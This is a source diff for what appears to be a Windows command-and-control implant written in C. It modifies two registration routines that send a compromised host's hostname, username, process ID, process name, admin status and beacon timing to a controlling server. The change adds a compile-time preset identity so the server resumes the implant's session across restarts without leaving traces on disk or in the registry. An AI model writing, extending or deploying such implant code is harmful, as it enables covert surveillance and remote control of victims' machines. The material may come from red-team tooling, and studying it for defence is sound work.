@@ -2,6 +2,14 @@
 #include "config.h"
 #include "crypto.h"
 #include "b64.h"
+
+// Preset agent ID embedded at build time (-DAGENT_PRESET_ID="<uuid>").
+// Sent as resume_id on first connection so the server restores the pre-registered
+// session across restarts — no disk or registry access required.
+#ifndef AGENT_PRESET_ID
+#define AGENT_PRESET_ID ""
+#endif
+
 #include <windows.h>
 #include <winhttp.h>
 #include <wincrypt.h>
@@ -460,14 +468,29 @@ int agent_register(void) {
         username_j[_j++] = username[_i];
     }
 
-    char body[1024];
-    snprintf(body, sizeof(body),
-        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
-        "\"pid\":%lu,\"transport\":\"%s\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
-        hostname, username_j, (unsigned long)GetCurrentProcessId(),
-        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
-        is_elevated() ? "true" : "false", AGENT_PARENT_ID);
+    // Determine resume_id: prefer in-memory agent_id (same-process reconnect),
+    // fall back to compile-time AGENT_PRESET_ID (cross-restart persistent identity).
+    const char *resume_id = g_agent.agent_id[0] ? g_agent.agent_id
+                          : (AGENT_PRESET_ID[0]  ? AGENT_PRESET_ID : NULL);
+    char body[1280];
+    if (resume_id) {
+        snprintf(body, sizeof(body),
+            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
+            "\"pid\":%lu,\"transport\":\"%s\","
+            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\","
+            "\"resume_id\":\"%s\"}",
+            hostname, username_j, (unsigned long)GetCurrentProcessId(),
+            AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
+            is_elevated() ? "true" : "false", AGENT_PARENT_ID, resume_id);
+    } else {
+        snprintf(body, sizeof(body),
+            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
+            "\"pid\":%lu,\"transport\":\"%s\","
+            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
+            hostname, username_j, (unsigned long)GetCurrentProcessId(),
+            AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
+            is_elevated() ? "true" : "false", AGENT_PARENT_ID);
+    }
 
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     if (!http_do("POST", "/register",
@@ -772,14 +795,29 @@ int agent_http_register(void) {
         if (username[_i] == '\\') username_j2[_j++] = '\\';
         username_j2[_j++] = username[_i];
     }
-    char body[1024];
-    snprintf(body, sizeof(body),
-        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
-        "\"pid\":%lu,\"transport\":\"%s\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
-        hostname, username_j2, (unsigned long)GetCurrentProcessId(),
-        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
-        is_elevated() ? "true" : "false", AGENT_PARENT_ID);
+    // Determine resume_id: prefer in-memory agent_id (same-process reconnect),
+    // fall back to compile-time AGENT_PRESET_ID (cross-restart persistent identity).
+    const char *resume_id2 = g_agent.agent_id[0] ? g_agent.agent_id
+                           : (AGENT_PRESET_ID[0]  ? AGENT_PRESET_ID : NULL);
+    char body[1280];
+    if (resume_id2) {
+        snprintf(body, sizeof(body),
+            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
+            "\"pid\":%lu,\"transport\":\"%s\","
+            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\","
+            "\"resume_id\":\"%s\"}",
+            hostname, username_j2, (unsigned long)GetCurrentProcessId(),
+            AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
+            is_elevated() ? "true" : "false", AGENT_PARENT_ID, resume_id2);
+    } else {
+        snprintf(body, sizeof(body),
+            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
+            "\"pid\":%lu,\"transport\":\"%s\","
+            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
+            hostname, username_j2, (unsigned long)GetCurrentProcessId(),
+            AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
+            is_elevated() ? "true" : "false", AGENT_PARENT_ID);
+    }
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     if (!http_do("POST", "/register", (const uint8_t*)body, strlen(body),
                  &resp, &resp_len, &status) || status != 200 || !resp)
